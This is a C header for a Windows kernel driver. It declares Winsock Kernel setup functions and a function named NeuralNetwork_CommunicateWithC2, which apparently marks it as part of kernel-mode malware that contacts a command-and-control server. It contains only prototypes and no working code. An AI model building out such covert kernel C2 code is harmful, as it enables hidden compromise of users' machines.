#pragma once

#include <ntddk.h>
#include <wsk.h>
#include "nn.h"

// Function prototypes
NTSTATUS InitializeWskData(void);
void FreeWskData(void);
NTSTATUS NeuralNetwork_CommunicateWithC2(NeuralNetwork* nn);

// WSK client dispatch table
extern WSK_CLIENT_DISPATCH WskClientDispatch;